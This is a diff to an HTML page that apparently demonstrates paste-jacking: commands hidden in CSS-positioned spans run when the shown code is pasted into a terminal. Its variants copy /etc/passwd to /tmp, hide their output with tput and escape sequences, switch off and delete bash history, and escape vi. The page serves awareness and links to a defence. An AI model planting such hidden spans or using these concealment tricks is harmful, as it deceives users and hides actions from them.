@@ -8,6 +8,8 @@
 <body>
 <br>
 
+<p>Harmless Code:</p>
+
 <pre>
 echo test
 echo foobar
@@ -17,55 +19,23 @@ echo foobar
 <hr>
 <br/>
 
-
+<p>Still looks harmless, but paste it to the terminal and you'll see…</p>
 
 <pre>
-echo test<span style=" position:fixed;top:-100px;left:-100px;">
+echo test<span style=" position:fixed;top:-1000px;left:-1000px;">
 cp /etc/passwd /tmp/</span>
 echo foobar
 </pre>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 <br/>
 <hr>
 <br/>
 
+<p>This time you won't even see it in your terminal…</p>
+
 <pre>
-echo test<span style=" position:fixed;top:-100px;left:-100px;">
+echo test<span style=" position:fixed;top:-1000px;left:-1000px;">
 tput smcup
 cp /etc/passwd /tmp/
 tput rmcup && echo -en "\e[1A\e[2K"</span>
@@ -73,44 +43,41 @@ echo foobar
 </pre>
 
 
+<br/>
+<hr>
+<br/>
 
+<p>And this time not in the bash-history either…</p>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<pre>
+echo test<span style=" position:fixed;top:-1000px;left:-1000px;">
+tput smcup
+set +o history
+cp /etc/passwd /tmp/
+HISTCONTROL=ignorespace
+ set -o history
+ history -d $(history | tail -1 | cut -f2 -d\ )
+ history -d $(history | tail -1 | cut -f2 -d\ )
+ tput rmcup && echo -en "\e[1A\e[2K"</span>
+echo foobar
+</pre>
 
 
 <br/>
 <hr>
 <br/>
 
-<pre><span style=" position:fixed;top:-100px;left:-100px;">:q!
+<p>Copying to vi won't help you…</p>
+
+<pre><span style=" position:fixed;top:-1000px;left:-1000px;">:q!
 tput smcup
 cp /etc/passwd /tmp/
 tput rmcup && echo -en "\e[1A\e[2K"</span>
 echo test
 echo foobar
 </pre>
+
+<p><a href="https://github.com/Nudin/copy-paste-and-the-terminal">How to avoid</a></p>
 
 </body>
 
